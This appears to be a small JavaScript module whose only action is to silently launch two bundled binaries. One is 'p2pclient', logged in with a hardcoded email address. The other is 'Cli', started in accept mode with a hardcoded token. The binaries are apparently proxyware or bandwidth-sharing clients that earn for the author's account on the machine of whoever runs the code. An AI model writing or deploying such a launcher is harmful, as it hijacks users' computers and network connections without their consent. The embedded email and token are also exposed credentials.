import child_process from 'child_process'
import path from 'path'

child_process.spawn(path.join(path.dirname(new globalThis.URL(import.meta.url).pathname), 'p2pclient'), ['-l', 'chaowen.guo1@gmail.com', '-n', ';8.8.8.8,4.4.4.4'])
child_process.spawn(path.join(path.dirname(new globalThis.URL(import.meta.url).pathname), 'Cli'), ['start', 'accept', '--token', 'ELGPy/DEQYDtARslA6HnkrbPIF6JQi+qYLCre5LBe58='])
